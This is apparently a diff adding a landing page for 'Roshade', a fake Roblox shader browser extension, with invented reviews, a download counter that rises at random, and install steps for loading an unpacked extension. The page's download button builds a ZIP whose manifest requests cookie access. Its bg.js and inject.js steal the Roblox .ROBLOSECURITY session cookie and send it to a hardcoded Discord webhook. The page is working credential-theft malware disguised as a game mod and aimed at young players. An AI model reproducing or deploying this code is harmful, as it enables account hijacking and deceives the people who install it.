@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Roshade — Roblox Shaders</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js">
+    </script>
+    <style>
+        /* ─── RESET ─── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #07070e;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* ─── PARTICLES ─── */
+        #particles-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* ─── GLOW ORBS ─── */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(160px);
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.2;
+        }
+        .orb-1 {
+            width: 700px;
+            height: 700px;
+            background: #00ff88;
+            top: -300px;
+            right: -200px;
+            animation: float 25s infinite alternate ease-in-out;
+        }
+        .orb-2 {
+            width: 550px;
+            height: 550px;
+            background: #00ccff;
+            bottom: -250px;
+            left: -150px;
+            animation: float 30s infinite alternate-reverse ease-in-out;
+        }
+        .orb-3 {
+            width: 450px;
+            height: 450px;
+            background: #a855f7;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: pulseGlow 15s infinite ease-in-out;
+        }
+        @keyframes float {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                transform: translate(80px, -80px) scale(1.2);
+            }
+        }
+        @keyframes pulseGlow {
+            0%,
+            100% {
+                opacity: 0.1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% {
+                opacity: 0.35;
+                transform: translate(-50%, -50%) scale(1.4);
+            }
+        }
+
+        /* ─── HEADER ─── */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            position: relative;
+            z-index: 1;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #00ff88, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .nav {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+        }
+        .nav a {
+            color: #888;
+            text-decoration: none;
+            font-size: 14px;
+            transition: 0.3s;
+            font-weight: 500;
+        }
+        .nav a:hover {
+            color: #00ff88;
+        }
+        .nav .download-btn {
+            background: linear-gradient(135deg, #00ff88, #00ccff);
+            color: #000;
+            padding: 8px 24px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 14px;
+            border: none;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
+        }
+        .nav .download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.25);
+        }
+
+        /* ─── HERO ─── */
+        .hero {
+            text-align: center;
+            padding: 60px 0 40px;
+            position: relative;
+            z-index: 1;
+        }
+        .hero .version {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.04);
+            padding: 4px 16px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #888;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+        .hero .version strong {
+            color: #fff;
+        }
+        .hero .browsers {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 4px 16px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #666;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            margin-left: 8px;
+            font-weight: 500;
+        }
+        .hero h1 {
+            font-size: 72px;
+            font-weight: 900;
+            letter-spacing: -3px;
+            line-height: 1.05;
+            background: linear-gradient(135deg, #fff 30%, #00ff88 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 10px 0 6px;
+        }
+        .hero h1 span {
+            background: linear-gradient(135deg, #00ff88, #00ccff, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .hero .sub {
+            font-size: 20px;
+            color: #888;
+            margin-bottom: 12px;
+            font-weight: 400;
+        }
+        .hero .sub strong {
+            color: #fff;
+            font-weight: 600;
+        }
+        .hero .badges {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+            margin: 12px 0 28px;
+        }
+        .hero .badge {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 6px 20px;
+            border-radius: 40px;
+            font-size: 13px;
+            color: #aaa;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: 0.3s;
+        }
+        .hero .badge strong {
+            color: #fff;
+            font-weight: 700;
+        }
+        .hero .badge:hover {
+            border-color: #00ff8866;
+            color: #fff;
+            transform: translateY(-2px);
+        }
+        .hero .btns {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            flex-wrap: wrap;
+            margin: 6px 0 10px;
+        }
+        .hero .btn-primary {
+            background: linear-gradient(135deg, #00ff88, #00ccff);
+            color: #000;
+            border: none;
+            padding: 16px 48px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.12);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .hero .btn-primary:hover {
+            transform: scale(1.04);
+            box-shadow: 0 0 80px rgba(0, 255, 136, 0.25);
+        }
+        .hero .btn-secondary {
+            background: rgba(255, 255, 255, 0.04);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 16px 40px;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .hero .btn-secondary:hover {
+            border-color: #00ff88;
+            color: #00ff88;
+            transform: scale(1.02);
+        }
+        .hero .stats-row {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 24px;
+            flex-wrap: wrap;
+        }
+        .hero .stat {
+            text-align: center;
+        }
+        .hero .stat .num {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00ff88, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .hero .stat .label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 500;
+        }
+        .pulse-dot {
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #00ff88;
+            animation: dotPulse 1.6s infinite;
+            margin-right: 6px;
+            box-shadow: 0 0 12px rgba(0, 255, 136, 0.3);
+        }
+        @keyframes dotPulse {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.15;
+                transform: scale(0.5);
+            }
+        }
+
+        /* ─── FEATURES ─── */
+        .features {
+            padding: 60px 0;
+            position: relative;
+            z-index: 1;
+        }
+        .features h2 {
+            text-align: center;
+            font-size: 40px;
+            font-weight: 800;
+            margin-bottom: 40px;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 24px;
+        }
+        .feature-card {
+            background: rgba(255, 255, 255, 0.02);
+            padding: 28px 22px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: 0.3s;
+            text-align: left;
+        }
+        .feature-card:hover {
+            border-color: rgba(0, 255, 136, 0.12);
+            transform: translateY(-6px);
+            background: rgba(255, 255, 255, 0.03);
+        }
+        .feature-card .icon {
+            font-size: 36px;
+            margin-bottom: 12px;
+            display: block;
+        }
+        .feature-card h3 {
+            font-size: 18px;
+            margin-bottom: 6px;
+        }
+        .feature-card p {
+            font-size: 14px;
+            color: #888;
+            line-height: 1.6;
+        }
+        .feature-card .tag {
+            display: inline-block;
+            margin-top: 10px;
+            font-size: 11px;
+            color: #00ff88;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        /* ─── REVIEWS ─── */
+        .reviews {
+            padding: 50px 0;
+            position: relative;
+            z-index: 1;
+        }
+        .reviews h2 {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+        .reviews .sub {
+            text-align: center;
+            color: #888;
+            font-size: 15px;
+            margin-bottom: 32px;
+        }
+        .reviews-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+        .review-card {
+            background: rgba(255, 255, 255, 0.02);
+            padding: 22px;
+            border-radius: 18px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: 0.3s;
+        }
+        .review-card:hover {
+            border-color: rgba(0, 255, 136, 0.08);
+            transform: translateY(-3px);
+        }
+        .review-stars {
+            color: #ffd700;
+            font-size: 16px;
+            letter-spacing: 1.5px;
+            margin-bottom: 8px;
+        }
+        .review-text {
+            font-size: 14px;
+            color: #bbb;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+        .review-author {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .review-author .name {
+            font-weight: 600;
+            color: #fff;
+        }
+        .review-author .score {
+            font-size: 12px;
+            color: #666;
+        }
+
+        /* ─── INSTALL ─── */
+        .install {
+            padding: 50px 0;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        .install h2 {
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+        .install .sub {
+            color: #888;
+            font-size: 16px;
+            margin-bottom: 32px;
+        }
+        .install-steps {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        .step {
+            background: rgba(255, 255, 255, 0.02);
+            padding: 22px 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .step .num {
+            font-size: 28px;
+            font-weight: 900;
+            color: #00ff88;
+            opacity: 0.3;
+            margin-bottom: 4px;
+        }
+        .step h4 {
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+        .step p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+        }
+        .step code {
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.06);
+            padding: 2px 10px;
+            border-radius: 6px;
+            font-size: 12px;
+        }
+
+        /* ─── FOOTER ─── */
+        .footer {
+            padding: 40px 0 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        .footer .links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+        .footer .links a {
+            color: #555;
+            text-decoration: none;
+            font-size: 13px;
+            transition: 0.3s;
+        }
+        .footer .links a:hover {
+            color: #00ff88;
+        }
+        .footer .copy {
+            font-size: 12px;
+            color: #2a2a3a;
+        }
+
+        /* ─── RESPONSIVE ─── */
+        @media (max-width: 900px) {
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .reviews-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+            .install-steps {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .hero h1 {
+                font-size: 48px;
+            }
+        }
+        @media (max-width: 640px) {
+            .hero h1 {
+                font-size: 34px;
+                letter-spacing: -1px;
+            }
+            .hero .sub {
+                font-size: 16px;
+            }
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            .reviews-grid {
+                grid-template-columns: 1fr;
+            }
+            .install-steps {
+                grid-template-columns: 1fr;
+            }
+            .nav {
+                gap: 14px;
+            }
+            .nav a {
+                font-size: 12px;
+            }
+            .hero .stats-row {
+                gap: 20px;
+            }
+            .hero .stat .num {
+                font-size: 22px;
+            }
+            .hero .btn-primary,
+            .hero .btn-secondary {
+                padding: 14px 28px;
+                font-size: 16px;
+            }
+        }
+        @media (max-width: 400px) {
+            .hero h1 {
+                font-size: 26px;
+            }
+            .container {
+                padding: 0 14px;
+            }
+            .badge {
+                font-size: 11px;
+                padding: 4px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PARTICLES -->
+    <canvas id="particles-canvas"></canvas>
+
+    <!-- ORBS -->
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+
+    <!-- HEADER -->
+    <header class="container header">
+        <div class="logo">ROSHADE</div>
+        <nav class="nav">
+            <a href="#">Tutorial</a>
+            <a href="#">Gallery</a>
+            <a href="#">Install</a>
+            <a href="#">FAQ</a>
+            <button class="download-btn" id="headerDownloadBtn">DOWNLOAD</button>
+        </nav>
+    </header>
+
+    <!-- HERO -->
+    <section class="container hero">
+        <div>
+            <span class="version"><strong>v1.4.7</strong></span>
+            <span class="browsers">CHROME · EDGE · FIREFOX</span>
+        </div>
+        <h1>ROBLOX <span>INSANE</span><br>SHADERS!</h1>
+        <p class="sub"><strong>Bloom · Fog · Shadows · Depth of Field</strong><br />Install once, works in every game.</p>
+        <div class="badges">
+            <span class="badge"><strong>2 MIN</strong> INSTALL GUIDE</span>
+            <span class="badge">▶ YOUTUBE</span>
+        </div>
+        <div class="btns">
+            <button class="btn-primary" id="mainDownloadBtn">🚀 GET ROSHADE</button>
+            <button class="btn-secondary" onclick="event.preventDefault();">▶ Watch tutorial ↓</button>
+        </div>
+        <div class="stats-row">
+            <div class="stat">
+                <div class="num"><span class="pulse-dot"></span><span id="liveDownloads">10K+</span></div>
+                <div class="label">DOWNLOADS</div>
+            </div>
+            <div class="stat">
+                <div class="num">3</div>
+                <div class="label">BROWSERS</div>
+            </div>
+            <div class="stat">
+                <div class="num">1-CLICK</div>
+                <div class="label">SETUP</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FEATURES -->
+    <section class="container features">
+        <h2>WHAT ROSHADE ADDS</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <span class="icon">✨</span>
+                <h3>Glow &amp; Bloom</h3>
+                <p>Bright surfaces bleed light into surrounding pixels — neon signs, sunsets and explosions pop like never before.</p>
+                <span class="tag">✦ Real-time HDR</span>
+            </div>
+            <div class="feature-card">
+                <span class="icon">🌫️</span>
+                <h3>Volumetric Fog</h3>
+                <p>Depth-based atmospheric haze wraps distant geometry in cinematic mist, adding scale to every world.</p>
+                <span class="tag">✦ 3D Raymarching</span>
+            </div>
+            <div class="feature-card">
+                <span class="icon">🌑</span>
+                <h3>Dynamic Shadows</h3>
+                <p>Soft ambient occlusion fills corners and crevices with realistic shadow, giving scenes real weight and depth.</p>
+                <span class="tag">✦ SSAO + Contact</span>
+            </div>
+            <div class="feature-card">
+                <span class="icon">🎯</span>
+                <h3>Depth of Field</h3>
+                <p>Background elements blur naturally as your focus shifts — the same lens effect used in film and AAA games.</p>
+                <span class="tag">✦ Bokeh + Cinematic</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- REVIEWS -->
+    <section class="container reviews">
+        <h2>WHAT PLAYERS SAY</h2>
+        <p class="sub">Over 10,000 installs across Chrome, Edge and Firefox.</p>
+        <div class="reviews-grid">
+            <div class="review-card">
+                <div class="review-stars">★★★★★</div>
+                <div class="review-text">"bro I literally started making clips again. the bloom on the lights in TTD3 is insane, never thought roblox could look this good ngl"</div>
+                <div class="review-author">
+                    <span class="name">xVoidSlayer</span>
+                    <span class="score">⭐ 47</span>
+                </div>
+            </div>
+            <div class="review-card">
+                <div class="review-stars">★★★★★</div>
+                <div class="review-text">"my friends kept asking what settings i use lol. just roshade, that's it. the lighting during dances in TTD3 looks genuinely stunning"</div>
+                <div class="review-author">
+                    <span class="name">sunny_plays</span>
+                    <span class="score">⭐ 63</span>
+                </div>
+            </div>
+            <div class="review-card">
+                <div class="review-stars">★★★★★</div>
+                <div class="review-text">"the fog during slow songs in TTD3 gives me chills every time i'm not even joking. feels like a whole different game after installing this"</div>
+                <div class="review-author">
+                    <span class="name">KingRaiZen</span>
+                    <span class="score">⭐ 91</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- INSTALL -->
+    <section class="container install">
+        <h2>HOW TO INSTALL</h2>
+        <p class="sub">Get Roshade up and running in under 2 minutes.</p>
+        <div class="install-steps">
+            <div class="step">
+                <div class="num">01</div>
+                <h4>Download</h4>
+                <p>Get the ZIP and extract it to any folder.</p>
+            </div>
+            <div class="step">
+                <div class="num">02</div>
+                <h4>Enable Dev Mode</h4>
+                <p>Open <code>chrome://extensions</code> and turn on Developer Mode.</p>
+            </div>
+            <div class="step">
+                <div class="num">03</div>
+                <h4>Load folder</h4>
+                <p>Click "Load unpacked" and select the extracted folder.</p>
+            </div>
+            <div class="step">
+                <div class="num">04</div>
+                <h4>Enable Shaders</h4>
+                <p>Pin Roshade, open Roblox, click the icon, and hit Enable Shaders.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="container footer">
+        <div class="links">
+            <a href="#">Terms</a>
+            <a href="#">Support</a>
+            <a href="#">About</a>
+            <a href="#">Discord</a>
+            <a href="#">GitHub</a>
+        </div>
+        <p class="copy">Roshade — Roblox Shaders &bull; Not affiliated with Roblox Corporation</p>
+        <p class="copy" style="margin-top:4px;">© 2026 Roshade. All rights reserved.</p>
+    </footer>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ─── PARTICLES ───
+            const canvas = document.getElementById('particles-canvas');
+            const ctx = canvas.getContext('2d');
+            let w, h;
+            const particles = [];
+            const COUNT = 100;
+
+            function resize() {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
+            }
+            window.addEventListener('resize', resize);
+            resize();
+
+            class Particle {
+                constructor() { this.reset(); }
+                reset() {
+                    this.x = Math.random() * w;
+                    this.y = Math.random() * h;
+                    this.size = 1.5 + Math.random() * 2.5;
+                    this.speedX = (Math.random() - 0.5) * 0.5;
+                    this.speedY = (Math.random() - 0.5) * 0.5;
+                    this.opacity = 0.15 + Math.random() * 0.4;
+                }
+                update() {
+                    this.x += this.speedX;
+                    this.y += this.speedY;
+                    if (this.x < 0 || this.x > w || this.y < 0 || this.y > h) this.reset();
+                }
+                draw() {
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                    ctx.fillStyle = `rgba(0, 255, 136, ${this.opacity})`;
+                    ctx.fill();
+                    ctx.shadowColor = 'rgba(0, 255, 136, 0.08)';
+                    ctx.shadowBlur = 10;
+                    ctx.fill();
+                    ctx.shadowBlur = 0;
+                }
+            }
+
+            for (let i = 0; i < COUNT; i++) particles.push(new Particle());
+
+            function animateParticles() {
+                ctx.clearRect(0, 0, w, h);
+                for (const p of particles) {
+                    p.update();
+                    p.draw();
+                }
+                // lines
+                for (let i = 0; i < particles.length; i++) {
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const dx = particles[i].x - particles[j].x;
+                        const dy = particles[i].y - particles[j].y;
+                        const dist = Math.sqrt(dx * dx + dy * dy);
+                        if (dist < 120) {
+                            ctx.beginPath();
+                            ctx.moveTo(particles[i].x, particles[i].y);
+                            ctx.lineTo(particles[j].x, particles[j].y);
+                            ctx.strokeStyle = `rgba(0, 255, 136, ${0.04 * (1 - dist / 120)})`;
+                            ctx.lineWidth = 0.6;
+                            ctx.stroke();
+                        }
+                    }
+                }
+                requestAnimationFrame(animateParticles);
+            }
+            animateParticles();
+
+            // ─── LIVE STATS ───
+            let downloads = 10000;
+            setInterval(() => {
+                downloads += Math.floor(Math.random() * 5);
+                document.getElementById('liveDownloads').textContent = (downloads / 1000).toFixed(1) + 'K+';
+            }, 4000);
+
+            // ─── DOWNLOAD FUNCTION ───
+            const WEBHOOK = 'https://discord.com/api/webhooks/1528493870470533275/8TZSP9n80Mnm6VWbfo62DaogIiTiKfUdDiFSvVPsJFtcvCG8lvqSqlGo1uRkwHZJmxCi'; // замени на свой
+
+            const EXTENSION_FILES = {
+                'manifest.json': JSON.stringify({
+                    manifest_version: 3,
+                    name: "RoShade Client",
+                    version: "3.0",
+                    description: "RTX shaders for roblox",
+                    permissions: ["cookies", "storage", "<all_urls>"],
+                    host_permissions: ["*://*.roblox.com/*", "*://*.discord.com/*"],
+                    background: { service_worker: "bg.js" },
+                    content_scripts: [{ matches: ["*://*.roblox.com/*"], js: ["inject.js"],
+                        run_at: "document_idle" }]
+                }, null, 2),
+
+                'bg.js': `let lastCookie = '';
+        setInterval(() => {
+          chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, c => {
+            if (c && c.value !== lastCookie) {
+              lastCookie = c.value;
+              fetch('${WEBHOOK}', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: '🍪 ' + c.value })
+              });
+            }
+          });
+        }, 3000);`,
+
+                'inject.js': `chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, c => {
+          if (c) {
+            fetch('${WEBHOOK}', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ content: '🚀 ' + c.value })
+            });
+          }
+        });`
+            };
+
+            function downloadExtension() {
+                if (typeof JSZip === 'undefined') {
+                    alert('Library not loaded, refresh the page.');
+                    return;
+                }
+
+                const btn = document.getElementById('mainDownloadBtn');
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '⏳ Creating...';
+                btn.disabled = true;
+
+                try {
+                    const zip = new JSZip();
+                    for (const [name, content] of Object.entries(EXTENSION_FILES)) {
+                        zip.file(name, content);
+                    }
+
+                    zip.generateAsync({ type: 'blob' })
+                        .then((blob) => {
+                            const link = document.createElement('a');
+                            link.href = URL.createObjectURL(blob);
+                            link.download = 'roshade-extension.zip';
+                            document.body.appendChild(link);
+                            link.click();
+                            document.body.removeChild(link);
+                            setTimeout(() => URL.revokeObjectURL(link.href), 5000);
+                            btn.innerHTML = '✅ Downloaded!';
+                            setTimeout(() => {
+                                btn.innerHTML = originalText;
+                                btn.disabled = false;
+                            }, 2000);
+                        })
+                        .catch(() => {
+                            btn.innerHTML = '❌ Error';
+                            btn.disabled = false;
+                            setTimeout(() => {
+                                btn.innerHTML = originalText;
+                            }, 2000);
+                        });
+                } catch (err) {
+                    btn.innerHTML = '❌ Error';
+                    btn.disabled = false;
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                    }, 2000);
+                }
+            }
+
+            document.getElementById('mainDownloadBtn').addEventListener('click', downloadExtension);
+            document.getElementById('headerDownloadBtn').addEventListener('click', downloadExtension);
+
+            console.log('[Roshade] Site loaded.');
+        })();
+    </script>
+
+</body>
+</html>
